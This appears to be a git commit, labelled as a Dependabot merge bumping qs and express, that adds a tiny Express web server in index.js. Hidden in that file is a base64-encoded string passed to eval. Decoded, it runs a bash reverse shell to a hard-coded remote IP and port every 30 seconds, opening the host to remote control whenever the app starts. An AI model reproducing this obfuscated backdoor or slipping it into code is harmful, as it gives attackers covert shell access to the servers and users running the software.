0b338cb683f8cdc09a755f930ff07d347af217b0
Kam <kam.lasater@cyclic.sh>
2023-05-31 10:38:44 -0400

    Merge pull request #59 from cyclic-software/dependabot/npm_and_yarn/qs-and-express-6.11.0
    Bump qs and express

---
+++ index.js
@@ -0,0 +1,8 @@
+const express = require('express')
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+const app = express()
+app.all('/', (req, res) => {
+    console.log("Just got a request!")
+    res.send('Yo!')
+})
+app.listen(process.env.PORT || 3000)
